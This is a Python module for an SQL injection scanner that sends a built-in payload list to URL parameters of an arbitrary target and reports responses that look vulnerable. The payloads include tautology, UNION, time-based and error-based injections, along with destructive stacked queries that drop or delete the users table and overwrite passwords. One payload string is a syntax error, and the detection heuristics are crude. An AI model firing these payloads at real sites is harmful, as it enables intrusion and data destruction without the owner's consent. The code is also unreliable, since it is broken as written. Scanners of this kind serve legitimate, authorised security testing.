"""SQL Injection Scanner Module"""

import re
import time
from tqdm import tqdm
from colorama import Fore, Style, init
from utils.http_client import HTTPClient

# Initialize colorama for cross-platform colored output
init(autoreset=True)

class SQLInjectionScanner:
    def __init__(self, http_client=None):
        self.http_client = http_client or HTTPClient()
        self.payloads = self.load_sql_payloads()
        self.vulnerable_params = []
        
        # SQL injection patterns for detection
        self.sql_patterns = [
            r"('|\")(\s*)(OR|AND)(\s+)('|\")(\s*)(\w+)",
            r"(\bUNION\b.*\bSELECT\b)",
            r"(\bSELECT\b.*\bFROM\b)",
            r"(\bINSERT\b.*\bINTO\b)",
            r"(\bDROP\b.*\bTABLE\b)",
            r"(\bDELETE\b.*\bFROM\b)",
            r"(\bUPDATE\b.*\bSET\b)",
            r"('|\")?;(\s*)(--|#)",
            r"(\bWAITFOR\b.*\bDELAY\b)",
            r"(\bBENCHMARK\b.*\()",
            r"(\bSLEEP\b.*\()",
            r"(\bPG_SLEEP\b.*\()",
        ]
        
        # SQL error patterns for detection
        self.sql_errors = [
            r"SQL syntax",
            r"MySQL.*error",
            r"ORA-[0-9]",
            r"Microsoft OLE DB Provider",
            r"Unclosed quotation mark",
            r"PostgreSQL.*ERROR",
            r"Warning.*mysql",
            r"Microsoft SQL Server",
            r"Invalid query",
            r"ODBC Driver",
            r"Driver.*SQL",
            r"Syntax error",
            r"MySQL server",
        ]

    def load_sql_payloads(self):
        """Load comprehensive SQL injection payloads"""
        payloads = [
            # Basic injection
            "'",
            "\"",
            "';",
            "\";",
            
            # Always true conditions
            "' OR '1'='1",
            "' OR 1=1--",
            "\" OR \"1\"=\"1",
            "\" OR 1=1--",
            "' OR 'a'='a",
            "' OR 'x'='x";--",
            
            # Union based
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,@@version,3--",
            "' UNION SELECT 1,database(),3--",
            
            # Boolean based
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND 'a'='a'--",
            "' AND 'a'='b'--",
            
            # Time based
            "' OR SLEEP(5)--",
            "' WAITFOR DELAY '00:00:05'--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            
            # Error based
            "' AND EXTRACTVALUE(1,CONCAT(0x3a,@@version))--",
            "' AND UPDATEXML(1,CONCAT(0x3a,@@version),1)--",
            
            # Stacked queries
            "'; DROP TABLE users--",
            "'; DELETE FROM users--",
            "'; UPDATE users SET password='hacked'--",
            
            # Bypass techniques
            "' OR '1'='1' /*",
            "' OR '1'='1' #",
            "'/**/OR/**/'1'='1",
        ]
        return payloads

    def scan(self, target_url):
        """Comprehensive SQL injection scan with progress tracking"""
        print(f"\n{Fore.BLUE}[SQL Injection Scan]{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Target: {target_url}{Style.RESET_ALL}")
        
        vulnerabilities = []
        
        # Test different injection points
        test_points = self.get_test_points(target_url)
        
        for point_name, test_url in test_points.items():
            print(f"\n{Fore.YELLOW}Testing {point_name}...{Style.RESET_ALL}")
            
            point_vulns = self.test_injection_point(test_url, point_name)
            vulnerabilities.extend(point_vulns)
            
            if point_vulns:
                print(f"{Fore.RED}❌ Vulnerabilities found in {point_name}{Style.RESET_ALL}")
            else:
                print(f"{Fore.GREEN}✅ No vulnerabilities in {point_name}{Style.RESET_ALL}")
        
        return vulnerabilities

    def get_test_points(self, target_url):
        """Generate different test points for SQL injection"""
        test_points = {}
        
        # Common URL parameters to test
        common_params = ['id', 'user', 'category', 'page', 'product', 'search']
        
        # Test in URL parameters
        for param in common_params:
            test_points[f"URL parameter '{param}'"] = f"{target_url}?{param}=test"
        
        # Test existing parameters if URL has query string
        if '?' in target_url:
            base_url = target_url.split('?')[0]
            query_string = target_url.split('?')[1]
            params = query_string.split('&')
            
            for param in params:
                if '=' in param:
                    param_name = param.split('=')[0]
                    test_points[f"Existing parameter '{param_name}'"] = target_url
        
        return test_points

    def test_injection_point(self, test_url, point_name):
        """Test a specific injection point"""
        vulnerabilities = []
        
        for payload in tqdm(self.payloads, 
                           desc=f"  Testing {point_name}", 
                           bar_format='{l_bar}{bar:50}{r_bar}{bar:-50b}',
                           leave=False):
            
            try:
                # Build test URL with payload
                if '?' in test_url:
                    test_url_with_payload = f"{test_url}{payload}"
                else:
                    test_url_with_payload = f"{test_url}?test={payload}"
                
                response = self.http_client.get(test_url_with_payload, timeout=8)
                
                if response and self.detect_sql_injection(response):
                    vulnerability = {
                        'type': 'SQL Injection',
                        'severity': 'high',
                        'url': test_url_with_payload,
                        'payload': payload,
                        'point': point_name,
                        'description': 'SQL injection vulnerability detected',
                        'recommendation': 'Use parameterized queries, input validation, and prepared statements'
                    }
                    vulnerabilities.append(vulnerability)
                    
                    # Don't test more payloads for this point if we found a vulnerability
                    break
                    
            except Exception as e:
                continue
                
            # Small delay to be respectful to the server
            time.sleep(0.1)
        
        return vulnerabilities

    def detect_sql_injection(self, response):
        """Enhanced SQL injection detection using multiple techniques"""
        if not response or not response.text:
            return False
        
        response_text = response.text.lower()
        
        # Technique 1: Error-based detection
        if self.detect_sql_errors(response_text):
            return True
        
        # Technique 2: Pattern-based detection in response
        if self.detect_sql_patterns(response_text):
            return True
        
        # Technique 3: Response time analysis (basic)
        # This would be enhanced in a real implementation
        
        # Technique 4: Content length changes (indicative of different responses)
        # This would track response variations
        
        return False

    def detect_sql_errors(self, response_text):
        """Detect SQL error messages in response"""
        for error_pattern in self.sql_errors:
            if re.search(error_pattern, response_text, re.IGNORECASE):
                return True
        return False

    def detect_sql_patterns(self, response_text):
        """Detect SQL patterns in response that indicate injection"""
        for pattern in self.sql_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False

    def is_sql_injection(self, payload):
        """Check if payload contains SQL injection patterns"""
        for pattern in self.sql_patterns:
            if re.search(pattern, payload, re.IGNORECASE):
                return True
        return False

    def scan_form(self, url, form_html):
        """Scan forms for SQL injection (placeholder for form handling)"""
        # This would be implemented when we add form extraction and submission
        print(f"{Fore.YELLOW}Form scanning not yet implemented{Style.RESET_ALL}")
        return []

    def generate_report(self, vulnerabilities):
        """Generate a detailed report of SQL injection findings"""
        if not vulnerabilities:
            return f"{Fore.GREEN}No SQL injection vulnerabilities found{Style.RESET_ALL}"
        
        report = [f"{Fore.RED}SQL Injection Vulnerabilities Found:{Style.RESET_ALL}"]
        
        for i, vuln in enumerate(vulnerabilities, 1):
            report.append(f"\n{Fore.YELLOW}{i}. {vuln['point']}{Style.RESET_ALL}")
            report.append(f"   {Fore.CYAN}URL: {vuln['url']}{Style.RESET_ALL}")
            report.append(f"   {Fore.MAGENTA}Payload: {vuln['payload']}{Style.RESET_ALL}")
            report.append(f"   {Fore.WHITE}Description: {vuln['description']}{Style.RESET_ALL}")
            report.append(f"   {Fore.GREEN}Recommendation: {vuln['recommendation']}{Style.RESET_ALL}")
        
        return "\n".join(report)
